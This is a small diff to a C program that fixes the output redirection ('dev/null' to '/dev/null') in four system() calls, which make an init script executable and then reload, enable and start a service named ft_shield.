@@ -62,10 +62,10 @@ void start_service(void)
 		exit(EXIT_FAILURE);
 	}
 	close(fd);
-	system("chmod +x /etc/init.d/ft_shield > dev/null 2>&1");
-	system("systemctl daemon-reload > dev/null 2>&1");
-	system("systemctl enable ft_shield > dev/null 2>&1");
-	system("systemctl start ft_shield > dev/null 2>&1");
+	system("chmod +x /etc/init.d/ft_shield > /dev/null 2>&1");
+	system("systemctl daemon-reload > /dev/null 2>&1");
+	system("systemctl enable ft_shield > /dev/null 2>&1");
+	system("systemctl start ft_shield > /dev/null 2>&1");
 }
 
 int	main()
